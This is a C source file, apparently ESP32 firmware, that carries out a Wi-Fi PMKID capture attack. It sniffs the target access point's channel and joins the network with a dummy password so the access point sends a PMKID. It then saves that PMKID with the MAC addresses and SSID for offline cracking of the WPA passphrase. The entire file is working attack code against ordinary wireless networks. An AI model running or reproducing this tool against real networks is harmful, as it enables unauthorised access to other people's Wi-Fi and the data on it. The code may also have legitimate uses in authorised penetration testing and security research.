/**
 * @file attack_pmkid.c
 * @brief Implements the PMKID capture attack.
 *
 * @see PMKID attack reference: https://hashcat.net/forum/thread-7717.html
 */
#include "attack_pmkid.h"

#include <stdbool.h>
#include <stdlib.h>
#include <string.h>

#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"

#include "wifi_controller.h"
#include "frame_analyzer.h"
#include "frame_analyzer_types.h"

static const char *TAG = "attack_pmkid";

static wifi_ap_record_t ap_record_copy;
static bool running = false;
static bool result_ready = false;
static attack_pmkid_result_t result;

static void pmkid_frame_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    ESP_LOGI(TAG, "Got PMKID, stopping attack...");

    pmkid_item_t *pmkid_item_head = *(pmkid_item_t **) event_data;

    wifictl_get_sta_mac(result.sta_mac);
    memcpy(result.ap_mac, ap_record_copy.bssid, 6);
    result.ssid_len = strlen((char *) ap_record_copy.ssid);
    memcpy(result.ssid, ap_record_copy.ssid, sizeof(result.ssid) - 1);
    result.ssid[sizeof(result.ssid) - 1] = '\0';
    // Only the first captured PMKID is kept; free the rest of the list.
    memcpy(result.pmkid, pmkid_item_head->pmkid, 16);
    result_ready = true;

    pmkid_item_t *pmkid_item = pmkid_item_head;
    while (pmkid_item != NULL) {
        pmkid_item_t *next = pmkid_item->next;
        free(pmkid_item);
        pmkid_item = next;
    }

    ESP_LOGD(TAG, "PMKID attack finished");
    attack_pmkid_stop();
}

void attack_pmkid_start(const wifi_ap_record_t *ap_record) {
    if (running) {
        ESP_LOGW(TAG, "PMKID attack already running, stop it first");
        return;
    }
    ESP_LOGI(TAG, "Starting PMKID attack...");
    memcpy(&ap_record_copy, ap_record, sizeof(ap_record_copy));
    result_ready = false;

    wifictl_sniffer_filter_frame_types(true, false, false);
    wifictl_sniffer_start(ap_record_copy.primary);
    frame_analyzer_capture_start(SEARCH_PMKID, ap_record_copy.bssid);
    wifictl_sta_connect_to_ap(&ap_record_copy, "dummypassword");
    ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID, &pmkid_frame_handler, NULL));
    running = true;
}

void attack_pmkid_stop() {
    if (!running) {
        return;
    }
    wifictl_sta_disconnect();
    wifictl_sniffer_stop();
    frame_analyzer_capture_stop();
    ESP_ERROR_CHECK(esp_event_handler_unregister(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID, &pmkid_frame_handler));
    running = false;
    ESP_LOGD(TAG, "PMKID attack stopped");
}

const attack_pmkid_result_t *attack_pmkid_get_result() {
    return result_ready ? &result : NULL;
}
